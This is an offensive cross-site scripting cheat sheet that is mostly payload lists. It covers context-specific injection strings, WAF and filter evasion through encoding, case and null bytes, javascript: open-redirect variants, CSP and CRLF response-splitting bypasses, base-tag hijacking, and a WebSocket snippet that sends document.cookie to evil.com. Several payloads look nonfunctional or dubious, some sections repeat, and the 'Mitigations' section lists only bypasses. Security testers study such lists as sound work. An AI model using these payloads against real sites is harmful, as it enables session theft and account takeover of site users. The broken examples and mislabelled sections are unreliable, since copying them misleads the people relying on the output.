# Comprehensive Guide on Cross-Site Scripting (XSS) and Its Bypasses

## Table of Contents
1. [Introduction to XSS](#introduction-to-xss)
   1. [Types of XSS](#types-of-xss)
2. [Methodology for Detecting XSS](#methodology-for-detecting-xss)
   1. [Identify Injection Points](#identify-injection-points)
   2. [Determine Reflection Context](#determine-reflection-context)
3. [Contexts for XSS Injection](#contexts-for-xss-injection)
   1. [Raw HTML Context](#raw-html-context)
   2. [Inside HTML Tag Attributes](#inside-html-tag-attributes)
   3. [Inside JavaScript Code](#inside-javascript-code)
4. [Advanced Techniques and Bypasses](#advanced-techniques-and-bypasses)
   1. [Content Security Policy (CSP) Bypass](#content-security-policy-csp-bypass)
   2. [Polyglot XSS](#polyglot-xss)
   3. [Dangling Markup](#dangling-markup---html-scriptless-injection)
   4. [JSON-based XSS](#json-based-xss)
   5. [Bypassing Filters](#bypassing-filters)
   6. [Using HTML Entities](#using-html-entities)
   7. [Null Byte Injection](#null-byte-injection)
   8. [Case Variation](#case-variation)
   9. [Using Backticks in JavaScript](#using-backticks-in-javascript)
   10. [Chained XSS](#chained-xss)
5. [Exploiting DOM XSS](#exploiting-dom-xss)
   1. [Finding and Exploiting DOM XSS](#finding-and-exploiting-dom-xss)
6. [Debugging Client-Side JavaScript](#debugging-client-side-javascript)
   1. [Tools for Debugging](#tools-for-debugging)
7. [Mitigations and Best Practices](#mitigations-and-best-practices)
   1. [Input Validation and Sanitization](#input-validation-and-sanitization)
8. [Open Redirect Exploits](#open-redirect-exploits)
9. [How to Bypass Internal Filtering for XSS](#how-to-bypass-internal-filtering-for-xss)
10. [Understanding CSP](#understanding-csp)
    1. [Bypassing CSP](#bypassing-csp)
    2. [Exploiting Script Gadgets](#exploiting-script-gadgets)
11. [CRLF Injection to XSS](#crlf-injection-to-xss)
12. [Other Vulnerabilities Leading to XSS](#other-vulnerabilities-leading-to-xss)
    1. [PDF Generation Vulnerabilities](#pdf-generation-vulnerabilities)
    2. [XML Injection](#xml-injection)
    3. [XPath Injection Leading to XSS](#xpath-injection-leading-to-xss)
    4. [Unsafe Use of innerHTML](#unsafe-use-of-innerhtml)
    5. [Exploiting URL Fragments](#exploiting-url-fragments)
    6. [Misconfigured Content-Type Headers](#misconfigured-content-type-headers)
    7. [Injecting Malicious Frames](#injecting-malicious-frames)
    8. [Injecting Base Tags](#injecting-base-tags)
    9. [Exploiting SQL Errors](#exploiting-sql-errors)
    10. [Exif Data Injection to XSS](#exif-data-injection-to-xss)
    11. [IDN Homograph Attack](#idn-homograph-attack)
    12. [Other Advanced Techniques](#other-advanced-techniques)

## Introduction to XSS

XSS attacks enable attackers to inject malicious scripts into web pages. These scripts can execute in the context of a user's browser, allowing attackers to steal information, hijack sessions, or perform actions on behalf of the user.

### Types of XSS

- **Stored XSS**: The malicious script is permanently stored on the target server, such as in a database or comment field.
- **Reflected XSS**: The malicious script is reflected off a web server, typically via a URL query parameter.
- **DOM-Based XSS**: The vulnerability exists in the client-side code rather than the server-side code, and the attack payload is executed as a result of modifying the DOM environment.

## Methodology for Detecting XSS

### Identify Injection Points

Check if any value you control (parameters, path, headers, cookies) is reflected in the HTML or used by JavaScript code.

### Determine Reflection Context

- **Raw HTML**: Can you create new HTML tags or use attributes/events that support JavaScript?
- **Inside HTML Tag**: Can you exit to raw HTML or create events/attributes to execute JavaScript?
- **Inside JavaScript Code**: Can you escape the <script> tag or string context to execute arbitrary JavaScript?

## Contexts for XSS Injection

### Raw HTML Context

When your input is reflected in the raw HTML of a page, you can exploit it by injecting HTML tags that execute JavaScript. Common tags include:

```
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<svg onload=alert(1)>
```

### Inside HTML Tag Attributes

If your input is reflected within an attribute value, consider the following approaches:

Escape Attribute and Tag: 
```
"><img src=x onerror=alert(1)>
```

Event Handlers: If escaping the tag is not possible, use attributes like onfocus, onclick:
```
" autofocus onfocus=alert(1) x="
```

JavaScript Protocol: If within href, use javascript:
```
href="javascript:alert(1)"
```

### Inside JavaScript Code

If the input is reflected within JavaScript code, you need to break out of the string or the <script> tag to execute arbitrary code:

Escape String:
```
"; alert(1); "
```

Template Literals: If input is in a template literal:
```
`${alert(1)}`
```

## Advanced Techniques and Bypasses

### Content Security Policy (CSP) Bypass

CSP is a security measure that helps prevent XSS by specifying trusted content sources. However, it can be bypassed if not correctly configured.

### Polyglot XSS

Polyglot payloads can function in multiple contexts (HTML, JS, CSS) to bypass input filters.

Example Polyglot Payload:
```
"><svg onload=alert(1)><script>alert(1)</script>
```

### Dangling Markup - HTML Scriptless Injection

If you cannot create executing HTML tags, you might abuse dangling markup, which involves placing incomplete tags that break the current HTML context.

Example Dangling Markup:
```
<a href="/">Click here</a><b 
<script>alert(1)</script>
```

### JSON-based XSS

When web applications parse JSON data and directly insert it into the DOM without proper sanitization, it can lead to XSS.

Example JSON-based XSS:
```
{"name": "<img src=x onerror=alert(1)> "}
```

### Bypassing Filters

Using techniques like UTF-7 encoding, breaking out of existing tags, or leveraging uncommon payloads.

Example UTF-7 Encoding:
```
<iframe src="data:text/html;charset=utf-7,%2BADw-script%2BAD4-alert('XSS')%2BADw-/script%2BAD4-"></iframe>
```

### Using HTML Entities

Encoding the payload using HTML entities to bypass filters that block certain characters.

Example HTML Entities:
```
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

### Null Byte Injection

Using null bytes to bypass filters or terminate strings early.

Example Null Byte Injection:
```
<img src="x" onerror="alert(1)";%00" src="y">
<img src="x" onerror="alert(1)%00" src="y">
<svg onload="alert(1)%00">
<iframe src="javascript:alert(1)%00"></iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%00"></iframe>
<a href="javascript:alert(1)%00">Click me</a>
<form action="javascript:alert(1)%00" method="post"><input type="submit"></form>
<img src="x" onerror="alert(1)";%00" src="y">
```

### Case Variation

Altering the case of HTML tags and attributes to bypass case-sensitive filters.

Obfuscation Techniques:
```
// Obfuscation with white spaces
<scr\0ipt>alert(1)</scr\0ipt>

// Breaking up keywords
<scri/*foo*/pt>alert(1)</scri/*foo*/pt>

// Using concatenation
<scr\+ipt>alert(1)</scr\+ipt>
```

Unexpected Input Variations:
```
// Inline event handlers
<svg><a href="javascript:alert(1)">click</a></svg>

// Injecting into attributes
<input type="text" value="``><svg onload=alert(1)>">
```

Example Case Variation:
```
<Svg OnloAd=alert(1)>
```

### Using Backticks in JavaScript

Bypassing filters by using backticks in JavaScript for template literals.

Example Using Backticks:
```
<script>let a = `alert(1)`</script>
```

### Chained XSS

Combining multiple injection points to achieve a successful XSS attack.

Example Chained XSS:
Injecting part of the payload in one input and another part in a different input to form a complete attack.

## Exploiting DOM XSS

DOM XSS occurs when a script on the page modifies the DOM based on user input, potentially leading to the execution of malicious scripts.

### Finding and Exploiting DOM XSS

- **Identify Sinks**: Look for functions or methods (e.g., innerHTML, document.write) that render user-controlled input.
- **Control Flow**: Understand how user input flows through the application to these sinks.
- **Payload Construction**: Craft payloads that exploit these sinks.

Example DOM XSS Payload:
```
<input oninput="document.getElementById('output').innerHTML = this.value">
<input value="<img src=x onerror=alert(1)>">
```

## Debugging Client-Side JavaScript

When working with complex XSS payloads, debugging client-side JavaScript can help understand how input is processed and reflected.

### Tools for Debugging

**Browser Developer Tools**: Use the console, breakpoints, and step through the JavaScript code to understand the application flow and find XSS injection points.

## Mitigations and Best Practices

### Input Validation and Sanitization

Ensure all user inputs are validated and sanitized before being processed or rendered.

Bypassing Filters with HTML Entities:
```
<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

Bypassing Filters with Null Bytes:
Null byte injection can terminate strings early or bypass certain filters by injecting null characters.
```
<img src="x" onerror="alert(1)";%00" src="y">
```

## Open Redirect Exploits

Basic Open Redirect to XSS:
```
javascript:alert(1)
```

Bypassing "javascript" Word Filter with CRLF:
```
java%0d%0ascript%0d%0a:alert(0)
```

Abusing Bad Subdomain Filter:
```
javascript://sub.domain.com/%0Aalert(1)
```

JavaScript with "://":
```
javascript://%250Aalert(1)
```

```
// Variation with query
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
```

Other Variations:
```
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```

Open Redirect by Uploading SVG Files:

Using SVG files to perform open redirects can be effective, especially when the application allows file uploads.

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
```

Client-Side Prototype Pollution to XSS:

Prototype pollution in JavaScript occurs when an attacker can modify the properties of Object.prototype. This can lead to XSS if these properties are used in sensitive operations.

```
// Prototype pollution payload
Object.prototype.polluted = 'polluted';
```

If the application uses a polluted object property in a dangerous way, this can lead to XSS:

```
var obj = {};
alert(obj.polluted); // Outputs: polluted
```

## How to Bypass Internal Filtering for XSS

Bypassing internal filtering mechanisms such as Web Application Firewalls (WAFs) and input sanitization requires a deep understanding of how these filters operate and the techniques that can be used to circumvent them. This guide provides an in-depth look at various methods to bypass internal filtering mechanisms for XSS attacks.

Internal filters and WAFs are designed to prevent malicious inputs by inspecting, sanitizing, or blocking suspicious content. Common filtering techniques include:

- **Blacklisting**: Blocking known malicious patterns or keywords.
- **Whitelisting**: Allowing only specific safe inputs.
- **Encoding**: Converting special characters to their HTML entities.
- **Normalization**: Simplifying input to a consistent form for easier inspection.

### Techniques for Bypassing Filters

#### Encoding and Decoding

Using various encoding methods can help bypass filters that don't decode inputs before inspection.

URL Encoding:
```
%3Cscript%3Ealert(1)%3C/script%3E
```

Double URL Encoding:
```
%253Cscript%253Ealert(1)%253C/script%253E
```

HTML Entities:
```
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

Unicode Encoding:
```
\u003Cscript\u003Ealert(1)\u003C/script\u003E
```

#### Case Variation

Altering the case of HTML tags and attributes can bypass filters that are case-sensitive.

```
<ScRiPt>alert(1)</ScRiPt>
<Img sRc=x OnErRoR=alert(1)>
```

#### Comment Insertion

Inserting comments within the payload can break up patterns that the filter is looking for.

```
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
```

#### Using Null Bytes

Null byte injection can terminate strings early or bypass certain filters.

```
<img src="x" onerror="alert(1)%00" src="y">
<svg onload="alert(1)%00">
```

#### Breaking Up Keywords

```
<scri/*foo*/pt>alert(1)</scri/*foo*/pt>
```

#### Using Concatenation

```
<scr\+ipt>alert(1)</scr\+ipt>
```

#### Leveraging Browser Parsing Quirks

Different browsers may interpret malformed HTML or JavaScript in ways that can be exploited.

```
<scr<script>ipt>alert(1)</scr</script>ipt>
```

#### Incomplete Tags

```
<svg><a href="javascript:alert(1)">click</a></svg>
```

#### Inserting White Spaces and Line Breaks

Using white spaces and line breaks to bypass filters.

```
<scr\0ipt>alert(1)</scr\0ipt>
<svg
onload=alert(1)>
```

#### Combining Techniques

Combining multiple bypass techniques to create a payload that evades detection.

```
<scr\0ipt>alert(1)</scr\0ipt>
%3Cscript%3E%61lert(1)%3C/script%3E
<scr\+ipt>alert(1)%00</scr\+ipt>
```

### Real-World Examples

#### URL Encoding and Decoding

Using URL encoding to bypass filters that do not decode inputs before inspection.

Combining case variation and comment insertion to bypass case-sensitive filters.

```
<ScRiPt>alert(1)</ScRiPt>
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
```

#### Null Byte Injection

Using null bytes to terminate strings early or bypass certain filters.

```
<img src="x" onerror="alert(1)%00" src="y">
<svg onload="alert(1)%00">
```

#### Obfuscation and Concatenation

Using obfuscation and concatenation to avoid detection by filters.

```
<scri/*foo*/pt>alert(1)</scri/*foo*/pt>
<scr\+ipt>alert(1)</scr\+ipt>
```

## Understanding CSP

CSP works by allowing website owners to define a whitelist of trusted sources for content such as scripts, styles, images, and more. This is done through the Content-Security-Policy HTTP header. Key directives include:

- **default-src**: The default policy for loading content types.
- **script-src**: Defines trusted sources for JavaScript.
- **style-src**: Defines trusted sources for CSS.
- **img-src**: Defines trusted sources for images.

### Common CSP Misconfigurations

Misconfigured CSP policies are often the root cause of bypasses. Common issues include:

- Allowing unsafe-inline or unsafe-eval in script-src.
- Overly permissive whitelists.
- Failing to cover all possible directives, leaving certain content types unprotected.

## Bypassing CSP

JSONP (JSON with Padding) allows data to be fetched from a different domain using a <script> tag. If the JSONP endpoint is not properly secured, it can be exploited to execute arbitrary JavaScript.

Overly permissive CSP headers, such as those allowing unsafe-inline, can be exploited to run inline scripts directly.

```
<script nonce="random-nonce">alert(1)</script>
```

### Inline Script Allowances

When unsafe-inline is allowed, or if there is an oversight allowing inline scripts, attackers can inject their payload directly into inline scripts.

### Data URIs

Data URIs can sometimes be used to bypass CSP if they are allowed in the policy.

```
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
```

## Exploiting Script Gadgets

Script gadgets are existing pieces of code on a website that can be exploited to perform unintended actions. This is particularly effective if unsafe-inline or unsafe-eval is used.

### Exploitation

1. Find an existing inline script that can be manipulated.
2. Inject code that modifies the behavior of the script.

### Content Injection via Whitelisted CDNs

If a Content Delivery Network (CDN) is whitelisted, and the attacker can upload content to that CDN, they can inject malicious scripts.

#### Exploitation

1. Upload a malicious script to cdn.example.com.
2. Include the script on the target site:

```
<script src="https://cdn.example.com/malicious.js"></script>
```

### Subresource Integrity (SRI) Bypass

SRI is used to ensure that resources hosted on third-party servers have not been tampered with. However, if SRI is not used properly, it can be bypassed.

#### Exploitation

1. Host a script on a trusted domain without SRI.
2. Include the script:

```
<script src="https://trusted.com/script.js"></script>
```

### Mutation XSS

Mutation XSS exploits the way browsers handle dynamic content changes. If CSP allows unsafe-inline, attackers can inject payloads that mutate the DOM in unexpected ways.

#### Exploitation:

```
<div><img src=x onerror="alert(1)"></div>
<script>
document.querySelector('div').innerHTML = '<img src=x onerror="alert(1)">';
</script>
```

### Using WebSockets

WebSockets can sometimes be used to exfiltrate data or execute JavaScript if allowed by CSP.

#### Exploitation:

```
var ws = new WebSocket("wss://evil.com/socket");
ws.onopen = function() {
  ws.send(document.cookie);
};
```

### CSP Nonce Reuse

If the CSP nonce is reused or predictable, it can be exploited to run malicious scripts.

#### Exploitation

1. Predict or capture the nonce value.
2. Use the nonce to execute a script:

```
<script nonce="captured-nonce">alert(1)</script>
```

### Example of a Secure CSP Header

Here's an example of a secure CSP header that mitigates most XSS attacks:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random-nonce'; style-src 'self' 'nonce-random-nonce'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

## CRLF Injection to XSS

CRLF injection (Carriage Return Line Feed) is a vulnerability that occurs when an attacker can inject CRLF characters into an application, typically resulting in the manipulation of HTTP headers or log files. This guide explores how CRLF injection can be exploited to perform XSS attacks.

### Understanding CRLF Injection

CRLF injection vulnerabilities occur when an application improperly handles user input, allowing the injection of CR (Carriage Return, \r, %0d) and LF (Line Feed, \n, %0a) characters. This can lead to:

- Manipulation of HTTP headers
- Injection into logs
- HTTP response splitting

### Basic CRLF Injection

CRLF injection can be used to inject new headers or modify the existing ones by breaking the intended structure of the HTTP response.

```
GET /vulnerable.php?param=value%0d%0aInjected-Header: injected_value HTTP/1.1
```

In this example, Injected-Header: injected_value would be treated as a new header.

### CRLF Injection to XSS

By leveraging CRLF injection, an attacker can inject malicious content, including scripts, into the HTTP response, potentially leading to XSS.

#### Injecting Scripts via HTTP Response Splitting

HTTP response splitting occurs when CRLF injection allows the creation of additional HTTP responses. This can be exploited to insert scripts directly into the response body.

Example:

Assume a vulnerable application includes user input directly in HTTP headers. An attacker can inject CRLF characters followed by a script tag.

```
GET /vulnerable.php?param=value%0d%0aContent-Length:%2023%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
```

### URL Redirection and CRLF Injection

Another approach is to use CRLF injection to manipulate redirection headers and include XSS payloads.

Consider an application that redirects users based on input parameters. An attacker can inject CRLF characters to terminate the location header and include a script.

```
GET /redirect.php?url=http://example.com%0d%0aLocation:%20http://attacker.com/xss.html HTTP/1.1
```

### Log Injection

CRLF injection can also be used to manipulate server logs, potentially leading to XSS when logs are viewed in an insecure application.

An attacker injects a script into log entries:

```
GET /vulnerable.php?param=value%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
```

### Advanced CRLF Injection Techniques

#### Double CRLF Injection

Using multiple CRLF sequences to break the HTTP response in more complex scenarios.

```
GET /vulnerable.php?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
```

#### Hybrid Injection

Combining CRLF injection with other techniques such as parameter pollution or path traversal to enhance the attack.

```
GET /vulnerable.php?param1=value1&param2=value2%0d%0aSet-Cookie:%20session=malicious_value%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
```

CRLF injection is a powerful technique that can lead to severe security vulnerabilities, including XSS. Understanding how to exploit and mitigate CRLF injection is crucial for securing web applications. By employing proper input validation, header handling, and security policies, developers can protect their applications from these attacks.

## Other Vulnerabilities Leading to XSS

### PDF Generation Vulnerabilities

#### Dynamic PDF Content Injection

When generating PDFs dynamically from user input, malicious content can lead to XSS.

```
// Vulnerable PDF generation code
$pdf->writeHTML($_POST['user_input']);
```

### XML Injection

XML data that includes user input can be manipulated to include malicious scripts.

```
<!-- Vulnerable XML data -->
<user>
  <name><?php echo $_POST['name']; ?></name>
</user>
```

### XPath Injection Leading to XSS

XPath injection vulnerabilities can be exploited to retrieve sensitive data and potentially inject XSS.

```
// Vulnerable XPath query
$query = "//user[name/text()='" . $_POST['name'] . "']";
$result = $xpath->query($query);
```

### Unsafe Use of innerHTML

Using innerHTML to insert user input into the DOM can lead to XSS.

```
document.getElementById('output').innerHTML = user_input;
```

### Exploiting URL Fragments

User-controlled fragments in URLs can be manipulated to inject scripts.

```
// Vulnerable code using location.hash
var fragment = location.hash.substring(1);
document.getElementById('output').innerHTML = fragment;
// If an attacker controls the URL
http://example.com#<img src=x onerror=alert(1)>
```

### Misconfigured Content-Type Headers

Misconfigured Content-Type headers can cause browsers to interpret data as executable scripts.

```
// Response with wrong Content-Type
Content-Type: text/html
{"user": "<script>alert(1)</script>"}
```

### Injecting Malicious Frames

Injecting malicious content into iframe sources can lead to XSS.

```
<iframe src="<?php echo $_GET['page']; ?>"></iframe>
// if an attacker submits
http://example.com/page.php?page=http://malicious.com
```

### Injecting Base Tags

If script tags and event handler attributes are blocked you can try to leverage base tags for XSS.

```
//lets say the site has a script tag like this
<script src="static/js/context.js"/>

//the attacker could inject
<base href="https://attacksite.com">

//and host their own static/js/context.js. note: the injection point must be above the targetted script
```

### Exploiting SQL Errors

If you see SQL errors, they are often not sanitized. This means they are worth checking for reflected XSS. This doesn't only apply to SQL specifically but it's the context I've seen this most.

### Exif Data Injection to XSS

Inject XSS Payloads into Exif data if the form is not sanitized properly.

Use a tool like ExifTool to embed a JavaScript payload in the EXIF metadata of an image.

```
exiftool -Title='<img src="x" onerror="alert(\'XSS via EXIF Metadata\')">' image.jpg
```

### IDN Homograph Attack

IDN allows the use of Unicode characters in domain names. Attackers can register domains that look visually similar to trusted domains by using characters from different languages that look alike. These domains can then host malicious content.

#### Detailed Example of IDN Homograph Attack

Domain Registration:

The attacker registers a domain that looks similar to a trusted domain. For example, they can replace the Latin letter "a" with the Cyrillic letter "а" (U+0430).

- Trusted domain: example.com
- Malicious domain: exаmple.com (notice the Cyrillic "а")

Punycode Representation:

Browsers convert Unicode domains to ASCII-compatible encoding called Punycode. This representation starts with xn--.

- example.com (trusted domain)
- exаmple.com (malicious domain) becomes xn--exmple-2of.com

Hosting Malicious Content:

The attacker hosts a page on xn--exmple-2of.com with malicious scripts designed to look like the legitimate site but contain XSS payloads.

Phishing Email or Link:

The attacker sends phishing emails or messages with links to the malicious domain, tricking users into clicking them.

### Other Advanced Techniques

#### Exploiting WebAssembly

WebAssembly (Wasm) code that includes user input can be manipulated to execute malicious scripts.

```
WebAssembly.instantiateStreaming(fetch('module.wasm'), { env: { userInput: user_input } });
```

#### JavaScript URL Injection

If an application uses URLs with the javascript: scheme in places where it accepts input, this can lead to XSS.

```
javascript:alert('XSS via JavaScript URL')
```

#### Referer Header Injection

If an application reflects the Referer header without sanitization, it can lead to XSS.

```
Referer: https://attacker-site.com/<img src=x onerror=alert('XSS via Referer Header')>
```

#### SVG Use Element Injection

The <use> element in SVG can reference external content. If an application accepts user input for SVG references and does not properly sanitize it, this can lead to XSS.

```
<use href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cimage href=x onerror=alert('XSS via SVG Use')%3E%3C/svg%3E">
```

#### Server-Sent Events (SSE) Injection

Server-Sent Events (SSE) allow servers to push updates to the client. If the data sent by the server is not sanitized, it can lead to XSS.

```
https://vulnerable-site.com/sse?data=<script>alert('XSS via SSE')</script>
```

#### EventSource API Injection

The EventSource API allows servers to push updates to the client. If the server sends unsanitized data, it can lead to XSS.

```
event: message\ndata: <script>alert('XSS via EventSource')</script>\n\n
```

#### CSS Content Property Injection

If an application allows user input in CSS properties without sanitization, it can lead to XSS.

Note: most browsers consider the content property text not HTML and this works under very certain conditions. Unsure whether the browser still accepts this however I have inserted here as a use case.

```
<style>
  .content::before { content: '<img src=x onerror=alert("XSS via CSS Content Property")>'; }
</style>
```

#### Drag and Drop File Path Injection

If a web application accepts dragged-and-dropped files and reflects their paths without sanitization, it can lead to XSS.

Find the Files here:
https://github.com/ShadowByte1/XSS-File-Path-Names

```
"><img src=x onerror=alert('XSS via File Path')>
```

#### Data Binding Libraries Injection

If an application uses data binding libraries (like AngularJS) and reflects user input without sanitization, it can lead to XSS.

```
<div ng-app ng-csp>
  <div ng-bind-html="'<img src=x onerror=alert(\'XSS via AngularJS\')>'"></div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
```
